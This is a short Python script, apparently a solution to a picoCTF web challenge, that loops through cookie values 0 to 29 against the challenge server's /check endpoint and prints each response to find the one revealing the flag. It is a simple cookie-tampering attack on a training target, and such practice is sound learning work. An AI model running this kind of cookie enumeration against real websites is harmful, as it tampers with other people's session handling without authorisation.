import requests
from bs4 import BeautifulSoup
url = 'http://mercury.picoctf.net:21485/check'

for i in range(30):
    cookie = {"name":str(i)}
    r = requests.get(url,cookies=cookie)
    soup = BeautifulSoup(r.text,'html.parser')
    print("cookie=",cookie)
    print(soup.body.text)
    print("*"*30)
